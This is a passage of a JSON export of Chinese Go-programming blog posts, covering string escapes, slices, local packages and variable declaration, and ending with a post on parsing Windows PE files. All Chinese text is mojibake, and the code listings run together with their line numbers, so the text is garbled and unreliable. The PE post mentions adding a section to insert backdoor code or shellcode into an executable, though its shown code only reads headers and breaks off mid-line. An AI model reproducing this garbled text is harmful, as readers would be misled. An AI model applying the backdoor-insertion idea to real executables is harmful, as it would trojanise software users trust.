//å†…å®¹ï¼šæ¬¢è¿ Go è¯­è¨€ä¸­çš„éƒ¨åˆ†è½¬ä¹‰å­—ç¬¦å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š è½¬ä¹‰å­—ç¬¦ å«ä¹‰ \\\\ è¡¨ç¤ºåæ–œçº¿ \\' å•å¼•å· \\&quot; åŒå¼•å· \\n æ¢è¡Œç¬¦ \\uhhhh 4 ä¸ª 16 è¿›åˆ¶æ•°å­—ç»™å®šçš„ Unicode å­—ç¬¦ åœ¨ Go è¯­è¨€ä¸­å•ä¸ªå­—ç¬¦å¯ä»¥ä½¿ç”¨å•å¼•å· (') æ¥åˆ›å»ºã€‚ä¹‹å‰çš„è¯¾ç¨‹ä¸­ï¼Œæˆ‘ä»¬æœ‰å­¦ä¹ è¿‡ rune ç±»å‹ï¼Œå®ƒç­‰åŒäº int32ï¼Œåœ¨ Go è¯­è¨€ä¸­ï¼Œä¸€ä¸ªå•ä¸€çš„å­—ç¬¦å¯ä»¥ç”¨ä¸€ä¸ªå•ä¸€çš„ rune æ¥è¡¨ç¤ºã€‚è¿™ä¹Ÿæ˜¯å®¹æ˜“ç†è§£çš„ï¼Œå› ä¸º Go è¯­è¨€çš„å­—ç¬¦ä¸²æ˜¯ UTF-8 ç¼–ç ï¼Œå…¶åº•å±‚ä½¿ç”¨ 4 ä¸ªå­—èŠ‚è¡¨ç¤ºï¼Œä¹Ÿå°±æ˜¯ 32 bitã€‚ åœ¨ Go è¯­è¨€ä¸­ï¼Œå­—ç¬¦ä¸²æ”¯æŒåˆ‡ç‰‡æ“ä½œï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœå­—ç¬¦ä¸²éƒ½æ˜¯ç”± ASCII å­—ç¬¦ç»„æˆï¼Œé‚£å¯ä»¥éšä¾¿ä½¿ç”¨åˆ‡ç‰‡è¿›è¡Œæ“ä½œï¼Œä½†æ˜¯å¦‚æœå­—ç¬¦ä¸²ä¸­åŒ…å«å…¶ä»–é ASCII å­—ç¬¦ï¼Œç›´æ¥ä½¿ç”¨åˆ‡ç‰‡è·å–æƒ³è¦çš„å•ä¸ªå­—ç¬¦æ—¶éœ€è¦ååˆ†å°å¿ƒï¼Œå› ä¸ºå¯¹å­—ç¬¦ä¸²ç›´æ¥ä½¿ç”¨åˆ‡ç‰‡æ—¶æ˜¯é€šè¿‡å­—èŠ‚è¿›è¡Œç´¢å¼•çš„ï¼Œä½†æ˜¯é ASCII å­—ç¬¦åœ¨å†…å­˜ä¸­å¯èƒ½ä¸æ˜¯ç”±ä¸€ä¸ªå­—èŠ‚ç»„æˆã€‚å¦‚æœæƒ³å¯¹å­—ç¬¦ä¸²ä¸­å­—ç¬¦ä¾æ¬¡è®¿é—®ï¼Œå¯ä»¥ä½¿ç”¨ range æ“ä½œç¬¦ã€‚å¦å¤–è·å–å­—ç¬¦ä¸²çš„é•¿åº¦å¯èƒ½æœ‰ä¸¤ç§å«ä¹‰ï¼Œä¸€ç§æ˜¯æŒ‡è·å–å­—ç¬¦ä¸²çš„å­—èŠ‚é•¿åº¦ï¼Œä¸€ç§æ˜¯æŒ‡è·å–å­—ç¬¦ä¸²çš„å­—ç¬¦æ•°é‡ã€‚å­—ç¬¦ä¸²æ”¯æŒä»¥ä¸‹æ“ä½œï¼š è¯­æ³• æè¿° s += t å°†å­—ç¬¦ä¸² t è¿½åŠ åˆ° s æœ«å°¾ s + t å°†å­—ç¬¦ä¸² s å’Œ t çº§è” s[n] ä»å­—ç¬¦ä¸² s ä¸­ç´¢å¼•ä½ç½®ä¸º n å¤„çš„åŸå§‹å­—èŠ‚ s[n:m] ä»ä½ç½® n åˆ°ä½ç½® m-1 å¤„å–å¾—çš„å­—ç¬¦ï¼ˆå­—èŠ‚ï¼‰ä¸² s[n:] ä»ä½ç½® n åˆ°ä½ç½® len(s)-1 å¤„å–å¾—çš„å­—ç¬¦ï¼ˆå­—èŠ‚ï¼‰ä¸² s[:m] ä»ä½ç½® 0 åˆ°ä½ç½® m-1 å¤„å–å¾—çš„å­—ç¬¦ï¼ˆå­—èŠ‚ï¼‰ä¸² len(s) å­—ç¬¦ä¸² s ä¸­çš„å­—èŠ‚æ•° len([]rune(s)) å­—ç¬¦ä¸² s ä¸­å­—ç¬¦çš„ä¸ªæ•°ï¼Œå¯ä»¥ä½¿ç”¨æ›´å¿«çš„æ–¹æ³• utf8.RuneCountInString() []rune(s) å°†å­—ç¬¦ä¸² s è½¬æ¢ä¸ºä¸€ä¸ª unicode å€¼ç»„æˆçš„ä¸² string(chars) chars ç±»å‹æ˜¯ []rune æˆ–è€… []int32, å°†ä¹‹è½¬æ¢ä¸ºå­—ç¬¦ä¸² []byte(s) æ— å‰¯æœ¬çš„å°†å­—ç¬¦ä¸² s è½¬æ¢ä¸ºä¸€ä¸ªåŸå§‹çš„å­—èŠ‚çš„åˆ‡ç‰‡æ•°ç»„ï¼Œä¸ä¿è¯è½¬æ¢çš„å­—èŠ‚æ˜¯åˆæ³•çš„ UTF-8 ç¼–ç å­—èŠ‚ è®©æˆ‘ä»¬å°è¯•ä¸€ä¸ªä¾‹å­ï¼Œåˆ›å»ºæºæ–‡ä»¶ string_t.goï¼Œç„¶åè¾“å…¥ä»¥ä¸‹æºä»£ç ï¼š 1234567891011121314151617package mainimport ( &quot;fmt&quot;)func main() &#123; t0 := &quot;\\u6B22\\u8FCE\\u6765\\u5230&quot; // t0å†…å®¹ï¼šæ¬¢è¿æ¥åˆ° t1 := &quot;\\u5B9E\\u9A8C\\u697C&quot; // t1å†…å®¹ï¼šå®éªŒæ¥¼ t2 := t0 + t1 for index, char := range t2 &#123; fmt.Printf(&quot;%-2d %U &#x27;%c&#x27; %X %d\\n&quot;, index, char, char, []byte(string(char)), len([]byte(string(char)))) &#125; fmt.Printf(&quot;length of t0: %d, t1: %d, t2: %d\\n&quot;, len(t0), len(t1), len(t2)) fmt.Printf(&quot;content of t2[0:2] is: %X\\n&quot;, t2[0:2])&#125; ç„¶åé€šè¿‡ä»¥ä¸‹æ–¹å¼è¿è¡Œï¼Œåœ¨è¿™é‡Œä¸€èµ·æ˜¾ç¤ºäº†ç¨‹åºçš„è¾“å‡ºï¼š 12345678910$ go run string_t.go0 U+6B22 &#x27;æ¬¢&#x27; E6ACA2 33 U+8FCE &#x27;è¿&#x27; E8BF8E 36 U+6765 &#x27;æ¥&#x27; E69DA5 39 U+5230 &#x27;åˆ°&#x27; E588B0 312 U+5B9E &#x27;å®&#x27; E5AE9E 315 U+9A8C &#x27;éªŒ&#x27; E9AA8C 318 U+697C &#x27;æ¥¼&#x27; E6A5BC 3length of t0: 12, t1: 9, t2: 21content of t2[0:2] is: E6AC è¯´æ˜ï¼š é€šè¿‡å‰é¢çš„è¯¾ç¨‹æˆ‘ä»¬çŸ¥é“é€šè¿‡ \\uhhhh çš„æ–¹å¼æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»º Unicode å­—ç¬¦ã€‚ åœ¨ä»¥ä¸Šç¨‹åºä¸­ï¼Œé¦–å…ˆé€šè¿‡ := ç¬¦å·åˆ›å»ºäº†å˜é‡ t0ï¼Œå…¶å€¼ä¸º \\u6B22\\u8FCE\\u6765\\u5230ï¼Œæ˜¯ æ¬¢è¿æ¥åˆ° ä¸­æ–‡å­—ç¬¦çš„ unicode ç¼–ç ï¼Œç„¶åä»¥åŒæ ·çš„æ–¹å¼åˆ›å»ºäº†å˜é‡ t1ï¼Œå…¶å€¼ä¸º å®éªŒæ¥¼ï¼Œç„¶åé€šè¿‡ + æ“ä½œç¬¦å°† t0 å’Œt1 æ‹¼æ¥èµ‹å€¼ç»™ t2ã€‚ç„¶åæˆ‘ä»¬é€šè¿‡ range æ“ä½œç¬¦å·å¯¹ unicode å­—ç¬¦ä¸² t2 ä¸­çš„æ¯ä¸€ä¸ª unicode å­—ç¬¦ä¾æ¬¡æ“ä½œï¼Œæˆ‘ä»¬è¿™é‡Œåªæ˜¯ç®€å•çš„æ‰“å°å‡ºæ¯ä¸ªå­—ç¬¦åœ¨ t2 ä¸­çš„ä½ç½®ï¼Œæ¯ä¸ªå­—ç¬¦çš„ unicode ç å€¼ï¼Œæ¯ä¸ªå­—ç¬¦çš„å­—é¢é‡ï¼Œæ¯ä¸ªå­—ç¬¦çš„åå…­è¿›åˆ¶å€¼ï¼Œä»¥åŠæ¯ä¸ªå­—ç¬¦çš„å­—èŠ‚é•¿åº¦ã€‚ è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ fmt åŒ…ç§æ”¯æŒçš„æ ¼å¼æŒ‡ä»¤ï¼Œå¦‚æœè¯»è€…å­¦ä¹ è¿‡ C è¯­è¨€çš„è¯å°±ä¸€ç›®äº†ç„¶ã€‚æ¥ç€ï¼Œæˆ‘ä»¬é€šè¿‡ len æ“ä½œç¬¦è®¡ç®—å‡ºäº†æ¯ä¸ªå­—ç¬¦ä¸²çš„å­—èŠ‚é•¿åº¦ã€‚æœ€åï¼Œæˆ‘ä»¬ä½¿ç”¨åˆ‡ç‰‡è®¿é—®äº†å­—ç¬¦ä¸² t2 çš„ç¬¬ 0-1 ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯å‰ä¸¤ä¸ªå­—èŠ‚ï¼Œå…¶å†…å®¹ä¸º E6ACã€‚å‰é¢æˆ‘ä»¬è¯´åˆ°ä¸èƒ½ä½¿ç”¨åˆ‡ç‰‡çš„æ–¹å¼è®¿é—®é ASCII å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ï¼ŒåŸå› åœ¨è¿™é‡Œä¸€ç›®äº†ç„¶ã€‚å­—ç¬¦ æ¬¢ å…¶åº•å±‚ä½¿ç”¨äº†ä¸‰ä¸ªå­—èŠ‚è¡¨ç¤ºï¼Œå†…å®¹æ˜¯ E6ACA2ï¼Œå¦‚æœåªæ˜¯ç®€å•çš„ä½¿ç”¨åˆ‡ç‰‡ï¼ˆåªå–åˆ‡ç‰‡ä¸­çš„ä¸€é¡¹ï¼‰è®¿é—®çš„æ˜¯ä¸èƒ½è®¿é—®åˆ°æ•´ä¸ªå­—ç¬¦çš„ï¼Œå› ä¸ºå­—ç¬¦çš„åˆ‡ç‰‡æ˜¯é€šè¿‡å­—èŠ‚æ•°æ¥ç´¢å¼•çš„ã€‚","tags":[{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Goè¯­è¨€åŸºç¡€","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€åŸºç¡€","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"},{"name":"å­—ç¬¦ä¸²","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€åŸºç¡€/å­—ç¬¦ä¸²","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/%E5%AD%97%E7%AC%A6%E4%B8%B2/"}]},{"title":"ã€Go ç®€æ˜æ‰‹å†Œã€‘GoåŸºæœ¬è¯­æ³•â€”â€”åˆ‡ç‰‡","date":"2023-10-27T01:24:02.127Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€åŸºç¡€/åˆ‡ç‰‡/ã€Goç®€æ˜æ‰‹å†Œã€‘åˆ‡ç‰‡/","text":"ä¸€èˆ¬è€Œè¨€ï¼ŒGo è¯­è¨€çš„åˆ‡ç‰‡æ¯”æ•°ç»„æ›´åŠ çµæ´»ï¼Œå¼ºå¤§è€Œä¸”æ–¹ä¾¿ã€‚æ•°ç»„æ˜¯æŒ‰å€¼ä¼ é€’çš„ï¼ˆå³æ˜¯ä¼ é€’çš„å‰¯æœ¬ï¼‰ï¼Œè€Œåˆ‡ç‰‡æ˜¯å¼•ç”¨ç±»å‹ï¼Œä¼ é€’åˆ‡ç‰‡çš„æˆæœ¬éå¸¸å°ï¼Œè€Œä¸”æ˜¯ä¸å®šé•¿çš„ã€‚è€Œä¸”æ•°ç»„æ˜¯å®šé•¿çš„ï¼Œè€Œåˆ‡ç‰‡å¯ä»¥è°ƒæ•´é•¿åº¦ã€‚åˆ›å»ºåˆ‡ç‰‡çš„è¯­æ³•å¦‚ä¸‹ï¼š make([ ]Type, length, capacity) make([ ]Type, length) [ ]Type&#123;&#125; [ ]Type&#123;value1, value2, ..., valueN&#125; å†…ç½®å‡½æ•° make() ç”¨äºåˆ›å»ºåˆ‡ç‰‡ã€æ˜ å°„å’Œé€šé“ã€‚å½“ç”¨äºåˆ›å»ºä¸€ä¸ªåˆ‡ç‰‡æ—¶ï¼Œå®ƒä¼šåˆ›å»ºä¸€ä¸ªéšè—çš„åˆå§‹åŒ–ä¸ºé›¶å€¼çš„æ•°ç»„ï¼Œç„¶åè¿”å›ä¸€ä¸ªå¼•ç”¨è¯¥éšè—æ•°ç»„çš„åˆ‡ç‰‡ã€‚è¯¥éšè—çš„æ•°ç»„ä¸ Go è¯­è¨€ä¸­çš„æ‰€æœ‰æ•°ç»„ä¸€æ ·ï¼Œéƒ½æ˜¯å›ºå®šé•¿åº¦ï¼Œå¦‚æœä½¿ç”¨ç¬¬ä¸€ç§è¯­æ³•åˆ›å»ºï¼Œé‚£ä¹ˆå…¶é•¿åº¦ä¸ºåˆ‡ç‰‡çš„å®¹é‡ capacityï¼›å¦‚æœæ˜¯ç¬¬äºŒç§è¯­æ³•ï¼Œé‚£ä¹ˆå…¶é•¿åº¦è®°ä¸ºåˆ‡ç‰‡çš„é•¿åº¦ lengthã€‚ä¸€ä¸ªåˆ‡ç‰‡çš„å®¹é‡å³ä¸ºéšè—æ•°ç»„çš„é•¿åº¦ï¼Œè€Œå…¶é•¿åº¦åˆ™ä¸ºä¸è¶…è¿‡è¯¥å®¹é‡çš„ä»»æ„å€¼ã€‚å¦å¤–å¯ä»¥é€šè¿‡å†…ç½®çš„å‡½æ•° append() æ¥å¢åŠ åˆ‡ç‰‡çš„å®¹é‡ã€‚åˆ‡ç‰‡å¯ä»¥æ”¯æŒä»¥ä¸‹æ“ä½œï¼š æˆ‘ä»¬ç»ƒä¹ ä¸‹ï¼Œåˆ›å»ºæºæ–‡ä»¶ slice_array.goï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243package mainimport ( &quot;fmt&quot;)func main() &#123; a := [...]int&#123;1, 2, 3, 4, 5, 6, 7&#125; fmt.Printf(&quot;len and cap of array %v is: %d and %d\\n&quot;, a, len(a), cap(a)) fmt.Printf(&quot;item in array: %v is:&quot;, a) for _, value := range a &#123; fmt.Printf(&quot;% d&quot;, value) &#125; fmt.Println() s1 := a[3:6] fmt.Printf(&quot;len and cap of slice: %v is: %d and %d\\n&quot;, s1, len(s1), cap(s1)) fmt.Printf(&quot;item in slice: %v is:&quot;, s1) for _, value := range s1 &#123; fmt.Printf(&quot;%d&quot;, value) &#125; fmt.Println() s1[0] = 456 fmt.Printf(&quot;item in array changed after changing slice: %v is:&quot;, s1) for _, value := range a &#123; fmt.Printf(&quot;%d&quot;, value) &#125; fmt.Println() s2 := make([]int, 10, 20) s2[4] = 5 fmt.Printf(&quot;len and cap of slice: %v is: %d and %d\\n&quot;, s2, len(s2), cap(s2)) fmt.Printf(&quot;item in slice %v is:&quot;, s2) for _, value := range s2 &#123; fmt.Printf(&quot;%d&quot;, value) &#125; fmt.Println()&#125; ä»¥ä¸Šä»£ç ä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆåˆ›å»ºäº†ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„é•¿åº¦æ˜¯ç”± Go è¯­è¨€è‡ªåŠ¨è®¡ç®—å‡ºçš„ï¼ˆçœç•¥å·è¯­æ³•ï¼‰ï¼Œç„¶åé€šè¿‡åˆ‡ç‰‡æ“ä½œä»æ•°ç»„ a ä¸­åˆ›å»ºäº†åˆ‡ç‰‡ s1ï¼Œæ¥ç€æˆ‘ä»¬ä¿®æ”¹äº†è¯¥åˆ‡ç‰‡çš„ç¬¬ä¸€ä¸ªä½ç½®çš„æ•°å€¼ï¼Œç„¶åå‘ç°æ•°ç»„ a ä¸­çš„å€¼ä¹Ÿå‘ç”Ÿäº†å˜åŒ–ã€‚æœ€åæˆ‘ä»¬é€šè¿‡ make() å‡½æ•°åˆ›å»ºäº†ä¸€ä¸ªåˆ‡ç‰‡ï¼Œè¯¥åˆ‡ç‰‡çš„é•¿åº¦å’Œå®¹é‡åˆ†åˆ«ä¸º 10 å’Œ 20ï¼Œè¿˜å¯ä»¥å‘ç° Go è¯­è¨€å°†æœªåˆå§‹åŒ–çš„é¡¹è‡ªåŠ¨èµ‹äºˆé›¶å€¼ã€‚è¿è¡Œä»£ç è¾“å‡ºå¦‚ä¸‹ï¼š 12345678$ go run slice_array.golen and cap of array [1 2 3 4 5 6 7] is: 7 and 7item in array: [1 2 3 4 5 6 7] is: 1 2 3 4 5 6 7len and cap of slice: [4 5 6] is: 3 and 4item in slice: [4 5 6] is: 4 5 6item in array changed after changing slice: [456 5 6] is: 1 2 3 456 5 6 7len and cap of slice: [0 0 0 0 5 0 0 0 0 0] is: 10 and 20item in slice [0 0 0 0 5 0 0 0 0 0] is: 0 0 0 0 5 0 0 0 0 0","tags":[{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Goè¯­è¨€åŸºç¡€","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€åŸºç¡€","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"},{"name":"åˆ‡ç‰‡","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€åŸºç¡€/åˆ‡ç‰‡","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/%E5%88%87%E7%89%87/"}]},{"title":"Goç®€æ˜æ‰‹å†Œâ€”â€”Goåˆ›å»ºå¹¶ä½¿ç”¨æœ¬åœ°åŒ…","date":"2023-10-27T01:24:02.119Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€åŸºç¡€/package/ã€Goç®€æ˜æ‰‹å†Œã€‘Goåˆ›å»ºå¹¶ä½¿ç”¨æœ¬åœ°åŒ…/","text":"æ¦‚è¿°ï¼šGo åˆ›å»ºå¹¶ä½¿ç”¨æœ¬åœ°åŒ… [toc] åŒ… åŒ…æ˜¯å„ç§ç±»å‹å’Œå‡½æ•°çš„é›†åˆã€‚åœ¨åŒ…ä¸­ï¼Œå¦‚æœæ ‡ç¤ºç¬¦ï¼ˆç±»å‹åç§°ï¼Œå‡½æ•°åç§°ï¼Œæ–¹æ³•åç§°ï¼‰çš„é¦–å­—æ¯æ˜¯å¤§å†™ï¼Œé‚£è¿™äº›æ ‡ç¤ºç¬¦æ˜¯å¯ä»¥è¢«å¯¼å‡ºçš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥åœ¨åŒ…ä»¥å¤–ç›´æ¥ä½¿ç”¨ã€‚ $GOPATH ï¼šç¯å¢ƒå˜é‡ï¼ˆæŒ‡å‘ä¸€ä¸ªæˆ–å¤šä¸ªç›®å½•ï¼‰ï¼Œä»¥åŠå…¶å­ç›®å½• src ç›®å½•çš„ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ import å…³é”®å­—å¯¼å…¥åŒ…çš„æ—¶å€™ï¼ŒGo è¯­è¨€ä¼šåœ¨ $GOPATH å’Œ GOROOT ç›®å½•ä¸­æœç´¢åŒ…ã€‚ åˆ›å»ºå¹¶ä½¿ç”¨è‡ªå®šä¹‰åŒ… æºæ–‡ä»¶ æ³¨æ„ç‚¹ï¼š goæ–‡ä»¶åå’Œæ–‡ä»¶å¤¹åå¹¶æ²¡æœ‰å…³ç³»ï¼Œæ–‡ä»¶åå¯ä»¥æ˜¯ä»»æ„çš„ï¼Œæ–‡ä»¶å®šä¹‰çš„package æ‰æ˜¯æ ‡è¯† æ–¹æ³•å®šä¹‰ä¸€å®šå¾—æ˜¯é¦–å­—æ¯å¤§å†™ è‡ªå®šä¹‰åŒ…ä¸èƒ½å’Œå¯¼å…¥å¤„äºåŒçº§ç›®å½•ï¼Œå¿…é¡»å»ºä¸€ä¸ªæ–‡ä»¶å¤¹å­˜æ”¾è‡ªå®šä¹‰åŒ… å…ˆçœ‹ä¸€ä¸‹ç›®å½•ç»“æ„ï¼Œä»¥ä¸‹ç¤ºä¾‹æ˜¯å¯¼å…¥ä¸¤åŒ…ï¼Œä¸€ä¸ªæ˜¯addï¼Œä¸€ä¸ªæ˜¯simpleinterest 123456789â”‚ go.modâ”‚ main.goâ”‚ README.mdâ”‚â”œâ”€addâ”‚ add.goâ”‚â””â”€simpleinterest simpleinterest.go æ­¥éª¤è¯´æ˜ 1 åˆ›å»ºpackageæ–‡ä»¶å¤¹ 123mkdir packagego mod init packagetest æ‰§è¡Œä¸Šè¿°å‘½ä»¤åï¼Œä¼šç”Ÿæˆ go.mod æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹æ‰€ç¤º 123module packageTestgo 1.20 2 åˆ›å»ºå„ä¸ªæ–‡ä»¶ main.go 123456789101112131415161718192021222324252627282930313233package mainimport ( &quot;fmt&quot; &quot;log&quot; &quot;packageTest/add&quot; //å¯¼å…¥ add åŒ… è¿™ä¸ªåŒ…å¿…é¡»æ”¾åœ¨$GOPATHä¸‹æ‰å¯ &quot;packageTest/simpleinterest&quot;)var p, r, t = 5000.0, 10.0, 1.0/** init function to check if p, r and t are greater than zero */func init() &#123; println(&quot;Main package initialized&quot;) if p &lt; 0 &#123; log.Fatal(&quot;Principal is less than zero&quot;) &#125; if r &lt; 0 &#123; log.Fatal(&quot;Rate of interest is less than zero&quot;) &#125; if t &lt; 0 &#123; log.Fatal(&quot;Duration is less than zero&quot;) &#125;&#125;func main() &#123; c := add.Add(1, 2) //è°ƒç”¨ add åŒ…ä¸­çš„ add å‡½æ•° si := simpleinterest.Calculate(p, r, t) // è°ƒç”¨ simpleinterest åŒ…çš„ Calculate å‡½æ•° fmt.Println(c) fmt.Println(&quot;Simple interest is&quot;, si)&#125; simpleinterest/simpleinterest.go 1234567891011121314151617package simpleinterestimport &quot;fmt&quot;/* * init function added */func init() &#123; fmt.Println(&quot;Simple interest package initialized&quot;)&#125;//Calculate calculates and returns the simple interest for principal p, rate of interest r for time duration t yearsfunc Calculate(p float64, r float64, t float64) float64 &#123; interest := p * (r / 100) * t return interest&#125; add/add.go 12345package addfunc Add(a int, b int) (num int) &#123; return a + b&#125; 3 æ‰§è¡Œå¹¶è°ƒè¯• è¾“å‡ºå¦‚ä¸‹æ‰€ç¤º 1234Main package initializedSimple interest package initialized3Simple interest is 500","tags":[{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"go","slug":"go","permalink":"https://hodlyounger.github.io/tags/go/"},{"name":"package","slug":"package","permalink":"https://hodlyounger.github.io/tags/package/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Goè¯­è¨€åŸºç¡€","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€åŸºç¡€","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"},{"name":"package","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/Goè¯­è¨€åŸºç¡€/package","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/package/"}]},{"title":"Goå¼€å‘ç»éªŒ(1)","date":"2023-10-27T01:24:02.116Z","path":"B_Code/GO/Goå¼€å‘ç»éªŒ/Goå¼€å‘ç»éªŒ(1)/","text":"æ¦‚è¿°ï¼šGo å¸¸è§é—®é¢˜æ•´ç† [toc] 1 var ä¸ := çš„åŒºåˆ« := åªèƒ½åœ¨å£°æ˜â€œå±€éƒ¨å˜é‡â€çš„æ—¶å€™ä½¿ç”¨ï¼Œè€Œâ€œvarâ€æ²¡æœ‰è¿™ä¸ªé™åˆ¶ã€‚","tags":[{"name":"Go","slug":"Go","permalink":"https://hodlyounger.github.io/tags/Go/"},{"name":"Code\\Go","slug":"Code-Go","permalink":"https://hodlyounger.github.io/tags/Code-Go/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goå¼€å‘ç»éªŒ","slug":"B-Code/GO/Goå¼€å‘ç»éªŒ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C/"}]},{"title":"GO HACK PEæ–‡ä»¶åˆ†æ","date":"2023-10-27T01:24:02.114Z","path":"B_Code/GO/ã€Goã€‘GO_HACK_PEFILES/","text":"æ¦‚è¿°ï¼šä½¿ç”¨ go å¯¹ PEæ–‡ä»¶è¿›è¡Œåˆ†æ ä½¿ç”¨debug/peæ ‡å‡†åº“è¿›è¡Œè§£æ ä½¿ç”¨Readerå¯¹è±¡å¯¹PEæ–‡ä»¶å†…å®¹è¿›è¡Œè§£æ PEæ–‡ä»¶ç»“æ„ DOSheader åŒ…å«ç­¾åï¼ˆ0x5a4dï¼‰peheader(0x3cæŒ‡å‘0x50 0x45 0x00 0x00) dos stub coff file header optional header section table 12345678910// peå¤´type FileHeader struct &#123; Machine uint16 NumberOfSections uint16 // åˆ†åŒºæ•° TimeDateStamp uint32 PointerToSymbolTable uint32 NumberOfSymbols uint32 SizeOfOptionalHeader uint16 Characteristics uint16&#125; å¦‚æœéœ€è¦å¢åŠ æ–°åˆ†åŒºï¼Œæ’å…¥åé—¨ä»£ç ï¼Œéœ€è¦ä¿®æ”¹è¿™é‡Œçš„åˆ†åŒºæ•°å±æ€§ å¢åŠ æ–°çš„Sections æˆ–è€…åœ¨imagebaseä¸­å¢åŠ shellcode 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143package mainimport ( &quot;debug/pe&quot; &quot;encoding/binary&quot; &quot;fmt&quot; &quot;io&quot; &quot;log&quot; &quot;os&quot;)func main() &#123; f, err := os.Open(&quot;G:\\\\Windows\\\\WinSxS\\\\amd64_microsoft-windows-calc_31bf3856ad364e35_10.0.18362.1_none_7c1b713697f466dd\\\\calc.exe&quot;) // Modify for binary or change to accept args check(err) pefile, err := pe.NewFile(f) // åˆ›å»ºpeæ–‡ä»¶å¯¹è±¡ check(err) defer f.Close() defer pefile.Close() dosHeader := make([]byte, 96) // è¯»å–å‰96ä¸ªå­—èŠ‚ sizeOffset := make([]byte, 4) // Dec to Ascii (searching for MZ) _, err = f.Read(dosHeader) check(err) fmt.Println(&quot;[-----DOS Header / Stub----- headerå’Œstubè§£æ]&quot;) fmt.Printf(&quot;[+] Magic Value: %s%s\\n&quot;, string(dosHeader[0]), string(dosHeader[1])) // Validate PE+0+0 (Valid PE format) pe_sig_offset := int64(binary.LittleEndian.Uint32(dosHeader[0x3c:])) // ä»0x3cåå¼€å§‹è¯»å– f.ReadAt(sizeOffset, pe_sig_offset) // 